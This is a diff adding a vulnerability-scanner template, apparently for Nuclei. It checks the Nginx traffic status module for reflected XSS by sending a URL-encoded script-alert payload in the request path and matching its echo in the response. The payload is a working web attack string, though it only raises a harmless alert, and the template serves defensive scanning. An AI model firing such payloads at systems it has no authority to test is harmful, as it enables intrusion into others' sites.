@@ -1,0 +1,23 @@
+id: nginx-module-vts-xss
+info:
+  author: madrobot
+  name: Nginx virtual host traffic status module XSS
+  severity: medium
+  tags: nginx,xss
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - <script>alert(31337)</script>
+  - part: header
+    type: word
+    words:
+    - text/html
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E'
